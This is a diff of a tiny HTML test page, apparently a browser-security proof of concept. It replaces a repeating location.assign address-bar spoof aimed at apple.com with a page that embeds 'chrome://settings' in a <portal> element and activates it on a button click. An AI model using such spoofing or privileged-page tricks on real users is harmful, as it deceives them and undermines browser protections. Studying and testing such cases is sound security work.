@@ -1,18 +1,17 @@
-<body>  <input onclick="document.location='http://www.apple.com'" type="button" value="Click" />
 <html>
-  <script>
-function spoof()
+<body>
+<button onclick="activate()" style="background-color:red; font-size:36px;">
+CLICK ME TO ACTIVATE THE PORTAL
+</button>
+<script>
+var portal = document.createElement('portal')
+portal.src = "chrome://settings"
+portal.style = "height:1000px;width:1000px;"
+document.body.appendChild(portal)
 
-{
-window.location.assign("http://www.apple.com:2134");
-
-   
-
+function activate() {
+ portal.activate()
 }
-
-  spoof()
-
-setInterval(function(){spoof()}, 1300);
 </script>
-  </html>
 </body>
+</html>
